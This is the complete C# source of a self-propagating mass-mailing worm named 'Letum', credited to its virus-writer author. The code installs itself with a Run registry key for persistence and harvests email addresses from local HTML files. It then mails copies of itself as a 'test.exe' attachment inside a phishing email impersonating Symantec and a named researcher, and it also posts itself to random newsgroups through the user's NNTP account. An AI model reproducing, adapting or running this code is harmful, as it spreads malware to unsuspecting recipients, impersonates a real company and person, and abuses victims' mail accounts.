   /* Letum - Version 4
    * by Retro
    * http://retro.host.sk
    *
    * Special thanks to Genetix
    */

   using System;
   using System.Collections;
   using System.IO;
   using System.Net;
   using System.Net.Sockets;
   using System.Reflection;
   using System.Text;
   using System.Text.RegularExpressions;
   using System.Threading;
   using System.Windows.Forms;
   using Microsoft.Win32;

   namespace Letum22
   {
       public class Letum
       {
           static Module self;
           static string pferrie = "peter_ferrie@symantec.com";
           static string[] nSubject = new string[7] { "Warning!", "Virus Alert", "Customer Support", "Re:", "Re:Warning", "Letum", "Virus Report" };
           static string[] nData = new string[3] {"Dear Users\r\n\r\nDue to the high increase of the Letum worm, we have upgraded it to Category B. Please use our attached removal tool to scan and disinfect your computer from the malware.\r\n\r\n Regards\r\n Security Response",
                                                  "Hiya,\r\n\r\n I've found this tool a couple of weeks ago, and after using it i was surprised on how good it was on squashing viruses. I wonder if avers know about this? ;)",
                                                  ">>\r\n Maybe not but try this, i'm sure it will help you in your fight against malware. The engine it uses isnt to bad, but the searching speed is very fast for such a small size "};

           static ArrayList List = new ArrayList();

           [STAThread]
           static void Main()
           {
               //Creates and Initializes
               Random rand = new Random();
               Thread nntpThread = new Thread(new ThreadStart(nntp));
               Thread smtpThread = new Thread(new ThreadStart(smtp));

               // Gets all the modules that are part of this assembly
               self = Assembly.GetExecutingAssembly().GetModules()[0];

               // Collect Directories from C: and stores them in List
               CollectDirs(@"C:\", List);

               // Picks a random number between 0 and the number of entries in List
               int num = rand.Next(0, List.Count);

               // create variables and set folder to random directory
               object regData;
               string folder = List[num].ToString();

               // Retrieves the subkey "Software\Retro"
               RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Retro", true);

               if (key == null)
               {
                   // Sets up the registry, when run for the first time.
                   // Creates the subkey and sets the key to the directory its in
                   key = Registry.CurrentUser.CreateSubKey(@"Software\Retro");
                   key.SetValue("Letum", folder + @"\" + self.ScopeName);

                   // and copies itself to the choosen directory
                   File.Copy(self.FullyQualifiedName, folder.ToString() + @"\" + self.ScopeName);
               }

               // Read registry for last Host file and delete it
               regData = key.GetValue("Letum");
               File.Delete(regData.ToString());

               // Copy itself to choosen directory
               File.Copy(self.FullyQualifiedName, folder.ToString() + @"\" + self.ScopeName);

               // Writes new key to Software\Retro and Run
               key.SetValue("Letum", folder + @"\" + self.ScopeName);
               key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
               key.SetValue("Letum", folder + @"\" + self.ScopeName);

               // Close key
               key.Close();

               // Start threads
               nntpThread.Start();
               smtpThread.Start();

               num = rand.Next(0, 1983);

               // 1:1983 chance of displaying message
               if (num == rand.Next(0, 1983))
               {
                   MessageBox.Show("Dear Peter Ferrie \n\nGeNeTiX is a person not a f**king genetically modified food product. \nShe's not happy you called her that! \n\nRegards", "Name Entry Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
               }
           }

           static void nntp()
           {
               // Creates and Initializes
               TcpClient nntp = new TcpClient();
               ArrayList nGroup = new ArrayList();
               StringBuilder fuuencode = new StringBuilder();
               Random rand = new Random();

               // Set variables
               string s, sReply;
               int cursor = 0;
               object nntpServer = null;


               // Look in registry for an NNTP server
               RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Account Manager\Accounts");

               // Reads the entries in the key
               string[] lstSubDir = key.GetSubKeyNames();

               // For each one found do the following ...
               foreach (string subKey in lstSubDir)
               {
                   // Opens the Subkey
                   key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Account Manager\Accounts\" + subKey);
                   string[] d = key.GetValueNames();

                   foreach (string a in d)
                   {
                       if (a == "NNTP Server")
                       {
                           nntpServer = key.GetValue("NNTP Server");
                       }
                   }
               }

               if (nntpServer == null)
               {
                   nntpServer = "news.microsoft.com";
               }

               // Connect to news server
               try
               {
                   nntp.Connect("news.microsoft.com", 119);
               }
               catch
               {
                   return;
               }


               NetworkStream nStream = nntp.GetStream();
               StreamReader nReader = new StreamReader(nStream);
               StreamWriter nWriter = new StreamWriter(nStream);


               nWriter.AutoFlush = true;

               //Get the reply from server
               sReply = nReader.ReadLine();

               // If connection went ok then continue
               if (sReply.Substring(0, 3) != "200")
               {
                   // Get list of newsgroups
                   nWriter.WriteLine("LIST");
                   s = nReader.ReadLine();
                   MessageBox.Show(s);

                   while (s != ".")
                   {
                       s = nReader.ReadLine();

                       if (s != ".")
                       {
                           s = s.Substring(0, s.IndexOf(" "));
                           nGroup.Add(s);
                       }
                   }

                   int num = rand.Next(0, nGroup.Count);
                   object newsgroup = nGroup[num];

                   // Open the choosen newsgroup
                   nWriter.WriteLine("GROUP " + newsgroup);

                   // Server reply
                   sReply = nReader.ToString();

                   // If open was ok
                   if (sReply.Substring(0, 3) != "211")
                   {
                       // Carry on with posting a message
                       nWriter.WriteLine("POST");
                       sReply = nReader.ToString();

                       // If posting is ok
                       if (sReply.Substring(0, 3) != "340")
                       {
                           // Pick a random message subject
                           num = rand.Next(0, nSubject.Length);
                           string Subject = nSubject[num];

                           // Pick random message data
                           num = rand.Next(0, nData.Length);
                           string rsData = nData[num] + "\r\n\r\n";

                           // Set itself to read itself
                           FileStream inFile = new FileStream(self.ScopeName, FileMode.Open, FileAccess.Read);

                           // Set variable
                           byte[] bs = new byte[inFile.Length];

                           // Read itself
                           inFile.Read(bs, 0, (int)inFile.Length);

                           //Close
                           inFile.Close();

                           // Encode byte to ASCII
                           string uuencode = Encoding.ASCII.GetString(bs);
                           string uustring, sBuffer = uuencode, str = String.Empty;

                           if (sBuffer.Length % 3 != 0)
                           {
                               string trs = new string(' ', 3 - sBuffer.Length % 3);
                               sBuffer = String.Concat(sBuffer, trs);
                           }

                           int j = sBuffer.Length;

                           // Encode to uuencode
                           for (int i = 1; i <= j; i += 3)
                           {
                               str = String.Concat(str, Convert.ToString((char)((int)Convert.ToChar(sBuffer.Substring(i - 1, 1)) / 4 + 32)));
                               str = String.Concat(str, Convert.ToString((char)((int)Convert.ToChar(sBuffer.Substring(i - 1, 1)) % 4 * 16 + (int)Convert.ToChar(sBuffer.Substring(i, 1)) / 16 + 32)));
                               str = String.Concat(str, Convert.ToString((char)((int)Convert.ToChar(sBuffer.Substring(i, 1)) % 16 * 4 + (int)Convert.ToChar(sBuffer.Substring(i + 1, 1)) / 64 + 32)));
                               str = String.Concat(str, Convert.ToString((char)((int)Convert.ToChar(sBuffer.Substring(i + 1, 1)) % 64 + 32)));
                           }

                           // Replace all the spaces in the string to `
                           string udtf = str.Replace(' ', '`');

                           // Cut string down to 60 char chunks
                           while (cursor < udtf.Length)
                           {
                               int size = Math.Min(60, udtf.Length - cursor);
                               // Add M to each new line
                               fuuencode.Append("M");
                               // Adds the next 60 chars
                               fuuencode.Append(udtf, cursor, size);
                               // Adds newline
                               fuuencode.Append("\r\n");

                               cursor += size;
                           }

                           uustring = fuuencode.ToString();
                           // Removes the last occurrence of M
                           uustring = uustring.Remove(uustring.LastIndexOf("M"), 1);

                           // Sets up the message to be sent
                           string pData = "FROM: " + pferrie + "\r\nNEWSGROUPS: " + newsgroup + "\r\nSUBJECT: " + Subject + "\r\n\r\n" + nData + "begin 644 " + self.ScopeName + "\r\n" + uustring + "\r\n'\r\nend\r\n.";

                           // Send message
                           nWriter.WriteLine(pData);
                           sReply = nReader.ReadLine();

                           // If it was sent
                           if (sReply.Substring(0, 3) != "240")
                           {
                               nntp.Close();
                           }
                       }
                   }
               }
               nntp.Close();
           }

           static void smtp()
           {
               // Creates and Initializes
               TcpClient smtp = new TcpClient();
               StringBuilder b64String = new StringBuilder();
               Random rand = new Random();

               // Set variables
               object smtpServer = null;
               int smtpCursor = 0;
               string smReply;
               string boundary = "----=_NextPart_81_27_24";
               string htmlMsg = "<html><head></head><body bgcolor=\"white\" text=\"black\" link=\"blue\" vlink=\"purple\" alink=\"red\"><table border=\"0\" width=\"780\" bgcolor=\"white\"><tr><td width=\"154\" valign=\"top\" bgcolor=\"white\"><p>&nbsp; <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td width=\"154\"><p>&nbsp;<a href=\"http://www.symantec.com\">"
                              + "<img src=\"http://www.langtech.com/images/projects/symantec_logoESP.gif\" border=\"0\"></a></p><p>&nbsp;</td></tr><tr><td width=\"154\" background=\"http://security.symantec.com/sscv6/languageContent/ie/sym/images/us.navbar.background.gif\"><p>&nbsp;</p><p><font face=\"Verdana\" size=\"1\"><a href=\"http://www.symantec.com/legal/legal_note.html\">Legal Notices</a></font><font face=\"Verdana\" size=\"1\"> <br clear=\"all\"></font><font face=\"Verdana\" size=\"1\"><a href=\"http://www.symantec.com/legal/privacy.html\">Privacy Policy</a></font></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</td></tr></table><p>&nbsp;</td><td width=\"618\" valign=\"top\" bgcolor=\"white\"><p align=\"left\"><font face=\"Verdana\" size=\"2\"><br></font></p><p align=\"left\">&nbsp;</p><p align=\"left\">&nbsp; <div align=\"center\"><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"80%\"><tr><td width=\"616\"><p align=\"left\">&nbsp;</p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Dear User,</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Due to the high increase of the Letum worm, we have upgraded it to Category B. Please use our attached removal tool to scan and disinfect your computer from the malware.</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">If you have any comments or questions about this, then please contact us.</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Regards</font></p><p align=\"left\"><font face=\"Verdana\" size=\"2\">Peter Ferrie<br clear=\"all\"></font><font face=\"Verdana\" size=\"1\">Senior Anti-Virus Researcher / Senior Principal Software Engineer&nbsp;</font></td></tr></table></div>"
                              + "<p align=\"left\"></p><p align=\"left\"><div align=\"center\"><table border=\"0\" cellspacing=\"1\" width=\"100%\"><tr><td width=\"100%\" bgcolor=\"white\"><p align=\"center\"><font face=\"Verdana\" size=\"1\"><B>©1995 - 2006 Symantec Corporation All rights reserved.</font></td></B></tr></table></div></td></tr></table><p></p></body></html>";

               // Look in registry for an SMTP server
               RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Account Manager");

               // Reads the entries in the key
               string[] smtpDirs = key.GetSubKeyNames();

               // For each one found do the following ...
               foreach (string smtpKey in smtpDirs)
               {
                   // Opens the Subkey
                   RegistryKey smtpSubKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Account Manager\" + smtpKey, true);
                   // Read the Value for 'NNTP Server'
                   object Server = smtpSubKey.GetValue("SMTP Server");

                   // If the key isnt there
                   if (Server == null)
                   {
                       // Hard code our own
                       // !SMTP Server Relay Allowed!
                       smtpServer = "mail.primaryhost.org.uk";
                       // Continue looking just in case
                       continue;
                   }
                   else
                   {
                       // If key is found then store
                       smtpServer = smtpSubKey.GetValue("SMTP Server");
                   }
               }

               // Find the path of the new file
               key = Registry.CurrentUser.OpenSubKey(@"Software\Retro", true);
               object HostPath = key.GetValue("Letum");

               // Open file
               FileStream FileToB64 = new FileStream(HostPath.ToString(), FileMode.Open, FileAccess.Read);
               byte[] bArray = new byte[FileToB64.Length];
               // Read file
               int rBytes = FileToB64.Read(bArray, 0, (int)FileToB64.Length);
               // and then close it
               FileToB64.Close();

               // Convert to Base64
               string b64encoded = Convert.ToBase64String(bArray);

               // Insert \r\n after every 76 chars
               while (smtpCursor < b64encoded.Length)
               {
                   int Size = Math.Min(76, b64encoded.Length - smtpCursor);
                   b64String.Append(b64encoded, smtpCursor, Size);
                   b64String.Append("\r\n");
                   smtpCursor += Size;
               }

               // Connect to server
               smtp.Connect((string)smtpServer, 25);

               // Creates and Initializes
               NetworkStream smtpStream = smtp.GetStream();
               StreamReader smtpReader = new StreamReader(smtp.GetStream());
               StreamWriter smtpWriter = new StreamWriter(smtpStream);

               smtpWriter.AutoFlush = true;

               // Get the reply from server
               smReply = smtpReader.ToString();

               if (smReply.Substring(0, 3) != "220")
               {
                   smtpWriter.WriteLine("HELO localhost\r\n");
                   smReply = smtpReader.ToString();

                   if (smReply.Substring(0, 3) != "250")
                   {
                       try
                       {
                           foreach (string cDirs in List)
                           {
                               string[] htmlFiles = Directory.GetFiles(cDirs, "*html");

                               foreach (string htmlFile in htmlFiles)
                               {
                                   Regex hRegex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-9]+");

                                   FileStream inFile = new FileStream(htmlFile, FileMode.Open, FileAccess.Read);

                                   // Read html file
                                   byte[] source = new byte[inFile.Length];
                                   inFile.Read(source, 0, (int)inFile.Length);
                                   inFile.Close();

                                   // string htmlsource = Encoding.ASCII.GetString(source);

                                   foreach (Match strMatch in hRegex.Matches(Encoding.ASCII.GetString(source)))
                                   {
                                       // Message From
                                       smtpWriter.WriteLine("MAIL FROM: " + pferrie);
                                       smReply = smtpReader.ToString();

                                       if (smReply.Substring(0, 3) != "250")
                                       {
                                           // Message too
                                           smtpWriter.WriteLine("RCPT TO: " + strMatch);
                                           smReply = smtpReader.ToString();

                                           if (smReply.Substring(0, 3) != "250")
                                           {
                                               // Message input is ready
                                               smtpWriter.WriteLine("DATA");
                                               smReply = smtpReader.ToString();

                                               if (smReply.Substring(0, 3) != "354")
                                               {
                                                   // Write the contents
                                                   string mime = "FROM: Symantec Security Response <" + pferrie + ">\r\n"
                                                               + "TO: <" + strMatch + "> " + strMatch
                                                               + "SUBJECT: " + nSubject[rand.Next(0, nSubject.Length)] + "\r\n"
                                                               + "MIME-Version: 1.0\r\n"
                                                               + "Content-Type: multipart/mixed;\r\n\t"
                                                               + "boundary=\"" + boundary + "\""
                                                               + "X-Priority: 3\r\n"
                                                               + "X-MSMail-Priority: Normal\r\n"
                                                               + "X-Mailer: Microsoft Outlook Express 6.00.2900.2180\r\n"
                                                               + "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.2180\r\n\r\n"
                                                               + "This is a multi-part message in MIME format.\r\n"
                                                               + "--" + boundary + "\r\n"
                                                               + "Content-Type: text/html;\r\n\t"
                                                               + "charset\"iso-8859-1\"\r\n"
                                                               + "Content-Transfer-Encoding: 7bit\r\n\r\n"
                                                               + htmlMsg + "\r\n--" + boundary + "\r\n"
                                                               + "Content-Type: application/octet-stream;\r\n\t"
                                                               + "name=\"test.exe\"\r\n"
                                                               + "Content-Transfer-Encoding: base64\r\n"
                                                               + "Content-Disposition: attachment;\r\n\t"
                                                               + "filename=\"test.exe\"\r\n\r\n" + b64String + "\r\n\r\n"
                                                               + "--" + boundary + "--\r\n.\r\n";

                                                   smtpWriter.WriteLine(mime);
                                                   smReply = smtpReader.ToString();

                                                   if (smReply.Substring(0, 3) != "250")
                                                   {
                                                       // If email was sent ok then continue
                                                       continue;
                                                   }
                                                   else
                                                   {
                                                       int l = 0;

                                                       // Retry, up to five times
                                                       if (l < 5)
                                                       {
                                                           smtp.Close();
                                                           Letum.smtp();
                                                           l++;
                                                       }
                                                   }
                                               }
                                           }
                                       }
                                   }
                               }
                           }
                       }

                       catch (System.UnauthorizedAccessException) { }
                   }
               }

               // Close connection with server
               smtp.Close();
           }

           static void CollectDirs(string dir, ArrayList storage)
           {
               try
               {
                   string[] dirs = Directory.GetDirectories(dir);
                   foreach (string d in dirs)
                   {
                       storage.Add(d);
                       CollectDirs(d, storage);
                   }
               }
               catch (System.UnauthorizedAccessException) { }
           }
       }
   }
